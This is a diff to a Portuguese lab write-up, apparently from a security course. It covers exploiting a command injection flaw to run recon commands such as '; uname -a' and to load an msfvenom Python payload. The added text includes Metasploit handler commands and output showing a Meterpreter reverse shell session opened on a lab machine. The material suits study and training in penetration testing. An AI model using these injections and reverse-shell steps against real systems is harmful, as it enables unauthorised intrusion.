@@ -2,6 +2,19 @@
 
 **Objetivo:** repetir o exercício de invasão web com command injection, porém carregando um payload na máquina alvo para nos permitir acesso a um meterpreter.
 
+## Conhecendo mais sobre o servidor web
+
+Utilizando o injeção de comandos, podemos saber um pouco mais sobre o servidor que hospeda a página sendo atacada.
+
+* Para conhecer o sistema operacional: `; uname -a`
+  !Comando
+  !Resposta
+  O servidor usa o Linux
+* Para conhecer a arquitetura: `; uname -m`
+  !Comando
+  !Resposta
+  Com uma arquitetura de 32 bits
+  
 ## Criação do payload
 
 Criaremos o payload através do aplicativo msfvenom do metasploit.
@@ -92,7 +105,7 @@ index.html  index.lighttpd.html  index.nginx-debian.html  meu_payload.py
 ## Execução do ataque
 
 ### Passo 1 - iniciar a escuta
-Iniciamos a escuta informando o IP e a porta de escuta (a  mesma do payload)
+Iniciamos a escuta informando o IP e a porta de escuta (a  mesma do payload), e o payload
 ```
 msf > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
@@ -104,10 +117,22 @@ msf exploit(multi/handler) > set LPORT 6666
 LPORT => 6666
 msf exploit(multi/handler) > run
 [*] Started reverse TCP handler on 192.168.1.10:6666
+
+msf exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
+payload => python/meterpreter/reverse_tcp
 ```
 ### Passo 2 - Executar o payload no alvo
 
 
 
 ### Resultado
+```
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.1.10:6666 
+[*] Sending stage (24772 bytes) to 192.168.1.33
+[*] Meterpreter session 1 opened (192.168.1.10:6666 -> 192.168.1.33:38448) at 2025-09-12 00:10:58 -0300
+
+meterpreter >
+```
+Abertura do meterpreter com acesso a máquina alvo.
 
